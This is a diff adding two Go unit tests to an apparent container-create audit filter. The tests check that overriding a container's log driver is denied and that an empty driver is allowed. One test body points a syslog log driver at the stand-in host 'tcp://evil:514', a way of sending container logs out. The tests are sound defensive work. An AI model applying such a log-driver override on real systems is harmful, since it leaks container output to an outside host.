@@ -726,3 +726,31 @@ func TestAuditCreatePidsLimitPositiveAllowed(t *testing.T) {
 		t.Fatal("PidsLimit=1024 should be allowed")
 	}
 }
+
+func TestAuditCreateLogConfigDenied(t *testing.T) {
+	cfg := testConfig()
+	cfg.Audit.DenyLogConfigOverride = true
+
+	body := []byte(`{"Image":"alpine","HostConfig":{"LogConfig":{"Type":"syslog","Config":{"syslog-address":"tcp://evil:514"}}}}`)
+	result, err := AuditCreate(body, cfg)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if !result.Denied {
+		t.Fatal("expected deny for custom log driver")
+	}
+}
+
+func TestAuditCreateLogConfigEmptyAllowed(t *testing.T) {
+	cfg := testConfig()
+	cfg.Audit.DenyLogConfigOverride = true
+
+	body := []byte(`{"Image":"alpine","HostConfig":{"LogConfig":{"Type":""}}}`)
+	result, err := AuditCreate(body, cfg)
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if result.Denied {
+		t.Fatal("empty log driver (daemon default) should be allowed")
+	}
+}
